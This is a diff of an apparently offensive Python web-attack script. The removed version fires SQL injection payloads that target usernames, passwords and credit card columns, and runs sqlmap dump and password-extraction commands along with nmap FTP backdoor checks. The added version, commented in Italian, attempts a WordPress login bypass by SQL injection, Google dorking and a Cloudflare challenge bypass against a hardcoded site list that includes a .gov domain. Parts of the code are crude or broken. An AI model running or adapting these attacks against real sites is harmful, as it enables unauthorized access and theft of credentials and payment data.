@@ -1,212 +1,142 @@
-print("by @Hagg4r")                                                                                             
-
-import os
-import subprocess
 import requests
-from requests.exceptions import RequestException, SSLError
-from datetime import datetime
-import urllib3
-import time
-import sys
+from bs4 import BeautifulSoup
+import re
+import socket
 
-urllib3.disable_warnings()
-
-file_count = 1  # Initialize file_count globally
-
-def run_command(command):
-    """Run a command and return its output."""
-    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    return result.stdout, result.stderr
-
-def run_sudo_command(command):
-    """Run a command with sudo and return its output."""
-    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-    return result.stdout, result.stderr
-
-def save_to_file(filepath, data):
-    """Save data to a file."""
-    with open(filepath, 'a') as file:
-        file.write(data + '\n')
-
-def install_tools():
-    """Install necessary tools if not already installed."""
-    tools = {
-        "uniscan": ["sudo", "apt-get", "install", "-y", "uniscan"],
-        "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
-        "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
-        "whois": ["sudo", "apt-get", "install", "-y", "whois"],
-        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"],
-        "seclists": ["sudo", "apt-get", "install", "-y", "seclists"]
-    }
-    
-    for tool, install_command in tools.items():
-        print(f"Checking if {tool} is installed...")
-        if not is_tool_installed(tool):
-            print(f"{tool} not found. Installing {tool}...")
-            stdout, stderr = run_sudo_command(install_command)
-            if stdout:
-                print(stdout)
-            if stderr:
-                print(stderr)
-        else:
-            print(f"{tool} is already installed.")
-
-def is_tool_installed(tool_name):
-    """Check if a tool is installed."""
-    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
-
-def clear_screen():
-    """Clear the terminal screen."""
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def print_header():
-    """Print the animated header 'hagg4rscan'."""
-    colors = ['\033[91m', '\033[93m', '\033[92m', '\033[94m', '\033[95m', '\033[96m']
-    header = """
-     __  .__   __.   ______  __    __   __          ___   .___________.  ______   .______      
-|  | |  \ |  |  /      ||  |  |  | |  |        /   \  |           | /  __  \  |   _  \     
-|  | |   \|  | |  ,----'|  |  |  | |  |       /  ^  \ `---|  |----`|  |  |  | |  |_)  |    
-|  | |  . `  | |  |     |  |  |  | |  |      /  /_\  \    |  |     |  |  |  | |      /     
-|  | |  |\   | |  `----.|  `--'  | |  `----./  _____  \   |  |     |  `--'  | |  |\  \----.
-|__| |__| \__|  \______| \______/  |_______/__/     \__\  |__|      \______/  | _| `._____|                                                                               
-    """
-    for i in range(len(colors)):
-        sys.stdout.write("\r" + colors[i] + header)
-        sys.stdout.flush()
-        time.sleep(0.5)
-    print("\033[0m")  # Reset color to default
-
-def check_website_status(url):
-    """Check if the website is accessible."""
+# Funzione per estrarre l'IP da un indirizzo hostname
+def get_ip(hostname):
     try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(f"The website {url} is accessible.")
-            return True
-        else:
-            print(f"The website {url} is not accessible. Status code: {response.status_code}")
-            return False
-    except requests.RequestException as e:
-        print(f"An error occurred: {e}")
-        return False
-
-def perform_sql_injection(target_url, results_dir):
-    """Perform SQL Injection using the provided payloads."""
-    global file_count  # Declare file_count as global
-    payloads = [
-        "' OR 1=1 --",
-        "' OR '1'='1' --",
-        "' OR '1'='1'/*",
-        "' OR '1'='1'#",
-        "' OR 1=1 UNION SELECT 1,2,3 --",
-        "' OR 1=1 UNION SELECT NULL, NULL, NULL --",
-        "' OR 1=1 UNION SELECT username, password FROM users --",
-        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
-        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
-        "' OR 1=1 UNION SELECT email FROM users --",
-        "' OR 1=1 UNION SELECT password FROM users --",
-        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
-        "SELECT * FROM users WHERE username='admin';",
-        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
-        "UPDATE users SET password='newpassword' WHERE username='admin';",
-        "DELETE FROM users WHERE username='olduser';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
-        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
-        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
-        "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
-    ]
-    
-    file_count = 1  # Initialize file_count for this function
-    
-    for payload in payloads:
-        data = {
-            'username': f'admin{payload}',
-            'password': 'password'  # Update with the correct password field if needed
-        }
-
-        try:
-            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
-            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
-            with open(output_file, 'w') as file:
-                file.write(response.text)
-            print(f"Saved SQL Injection results to {output_file}")
-            file_count += 1
-        except Exception as e:
-            print(f"An error occurred during SQL Injection attempt: {e}")
-
-def perform_sqlmap_scan(target_url, results_dir):
-    """Perform a SQLmap scan on the target URL."""
-    global file_count  # Declare file_count as global
-    commands = [
-        ["sqlmap", "-u", target_url, "--dbs"],
-        ["sqlmap", "-u", target_url, "--tables"],
-        ["sqlmap", "-u", target_url, "--columns"],
-        ["sqlmap", "-u", target_url, "--dump"],
-        ["sqlmap", "-u", target_url, "--batch"],
-        ["sqlmap", "-u", target_url, "--level=5", "--risk=3"],
-        ["sqlmap", "-u", target_url, "--technique=U"],
-        ["sqlmap", "-u", target_url, "--technique=T"],
-        ["sqlmap", "-u", target_url, "--passwords"],
-        ["sqlmap", "-u", target_url, "--users"],
-        ["sqlmap", "-u", target_url, "--current-user"],
-        ["sqlmap", "-u", target_url, "--current-db"],
-        ["sqlmap", "-u", target_url, "--is-dba"],
-        ["sqlmap", "-u", target_url, "--roles"],
-        ["sqlmap", "-u", target_url, "--privileges"],
-        ["sqlmap", "-u", target_url, "--fingerprint"]
-    ]
-    
-    for command in commands:
-        try:
-            stdout, stderr = run_command(command)
-            output_file = os.path.join(results_dir, f'sqlmap_scan_{file_count}.txt')
-            with open(output_file, 'w') as file:
-                file.write(stdout)
-            print(f"Saved SQLmap scan results to {output_file}")
-            file_count += 1
-        except Exception as e:
-            print(f"An error occurred during SQLmap scan: {e}")
-
-def perform_ftp_scan(target_url, results_dir):
-    """Perform an FTP scan on the target URL."""
-    global file_count  # Declare file_count as global
-    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221", target_url]
-    try:
-        stdout, stderr = run_command(command)
-        output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
-        with open(output_file, 'w') as file:
-            file.write(stdout)
-        print(f"Saved FTP scan results to {output_file}")
-        file_count += 1
+        # Convertire il nome di dominio in IP usando la funzione gethostbyname del modulo socket
+        ip = socket.gethostbyname(hostname)
+        return ip
     except Exception as e:
-        print(f"An error occurred during FTP scan: {e}")
+        print(f"Errore: {e}")
+        return None
 
-def access_seclists():
-    """Function to access seclists database (placeholder implementation)."""
-    # Implement the actual logic to access seclists as needed
-    # This is just a placeholder function
-    return "Seclists database accessed successfully."
-
-def main():
-    """Main function to orchestrate the security scans."""
-    global file_count
-    
-    target_url = input("Enter the target URL: ")
-    results_dir = input("Enter the results directory: ")
-
-    if not os.path.exists(results_dir):
-        os.makedirs(results_dir)
-
-    if check_website_status(target_url):
-        perform_sql_injection(target_url, results_dir)
-        perform_ftp_scan(target_url, results_dir)
-        perform_sqlmap_scan(target_url, results_dir)
-        seclists_db = access_seclists()
-        print(seclists_db)
+# Funzione per eseguire lo scanner Whois su un sito web
+def whois_scan(site):
+    url = f"https://www.whois.com/whois/{site}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        result = soup.find("span", attrs={"class": "result-content"})
+        if result is not None:
+            print(result.text.strip())
     else:
-        print("The website is not accessible. Exiting...")
+        print(f"Errore: non è stato possibile scaricare i risultati Whois per {site}")
 
-if __name__ == "__main__":
-    main()
+# Funzione per cercare la pagina admin su un sito web
+def find_admin_page(site):
+    url = f"http://{site}"
+    response = requests.get(url)
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        links = [link["href"] for link in soup.find_all("a", href=True)]
+        admin_links = [link for link in links if "admin" in link.lower()]
+        if admin_links:
+            print(f"Pagina amministrativa trovata: {admin_links}")
+    else:
+        print(f"Errore: non è stato possibile cercare la pagina amministrativa per {site}")
+
+# Funzione per eseguire lo scanner SQL su un sito web
+def sql_scan(site):
+    url = f"http://{site}/wp-admin"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+    params = {"pageno": 1, "pagewanted": "all", "_xfRequestUri": "/wp-admin", "_xfNoJs": True}
+    response = requests.get(url, headers=headers, params=params)
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        form_action = soup.find("form", attrs={"id": "login-form"})
+        login_url = form_action["action"]
+        payload = {"log": "admin", "pwd": "' OR ''='"}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "Content-Type": "application/x-www-form-urlencoded"}
+        response = requests.post(login_url, data=payload, headers=headers)
+        if response.status_code == 200:
+            print("Accesso riuscito con SQL Injection!")
+        else:
+            print(f"Errore: non è stato possibile eseguire l'iniezione SQL per {site}")
+    else:
+        print(f"Errore: non è stato possibile cercare la pagina di accesso amministrativo per {site}")
+
+# Funzione per cercare Dorks su Google
+def google_dork(site):
+    url = f"https://www.google.com/search?q=site:{site}+inurl:admin"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        result_divs = soup.find_all("div", attrs={"class": "rc"})
+        for result in result_divs:
+            links = [link["href"] for link in result.find_all("a", href=True)]
+            print(f"Link trovato: {links}")
+    else:
+        print(f"Errore: non è stato possibile cercare Dorks su Google per {site}")
+
+# Funzione per bypassare Cloudflare
+def bypass_cloudflare(site):
+    url = f"https://{site}"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+    response = requests.get(url, headers=headers)
+    if response.status_code == 503:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        cf_challenge_token = re.search(r"var cf_challenge_token = '(.*?)';", str(soup)).group(1)
+        cf_fqdn = re.search(r"window.location.href = 'https://.+?';", str(soup)).group(0).replace("window.location.href =", "").strip().rstrip(";")
+        payload = {"pass": cf_challenge_token}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+            "Referer": f"https://{cf_fqdn}"}
+        response = requests.post(url, data=payload, headers=headers)
+        if response.status_code == 200:
+            print("Cloudflare bypassed!")
+        else:
+            print(f"Errore: non è stato possibile bypassare Cloudflare per {site}")
+    else:
+        print(f"Errore: non è stato possibile cercare la pagina amministrativa per {site}")
+
+# Funzione per cercare vulnerability CVE
+def cve_scan(site):
+    url = f"https://cve.mitre.org/cgi-bin/cvename?name={site}"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        soup = BeautifulSoup(response.text, 'html.parser')
+        cve_info = soup.find("td", attrs={"headers": "summary"})
+        if cve_info is not None:
+            print(f"Vulnerabilità CVE trovata: {cve_info.text.strip()}")
+    else:
+        print(f"Errore: non è stato possibile cercare la vulnerabilità CVE per {site}")
+
+# Funzione principale per eseguire lo scanner su un sito web
+def scan_site(site):
+    whois_scan(site)
+    find_admin_page(site)
+    sql_scan(site)
+    google_dork(site)
+    bypass_cloudflare(site)
+    cve_scan(site)
+
+# Elenca i siti web da analizzare
+sites = [
+    "sito.com",
+    "www.sito.net",
+    "site.gov",
+    "example.org"
+]
+
+# Scansiona ogni sito nella lista
+for site in sites:
+    print(f"\nScansione del sito {site}...")
+    ip = get_ip(site)
+    if ip is not None:
+        print(f"IP del sito: {ip}")
+        scan_site(site)
+    else:
+        print(f"Errore: non è stato possibile trovare l'IP per {site}")
+
+print("\nFine delle scansione.")
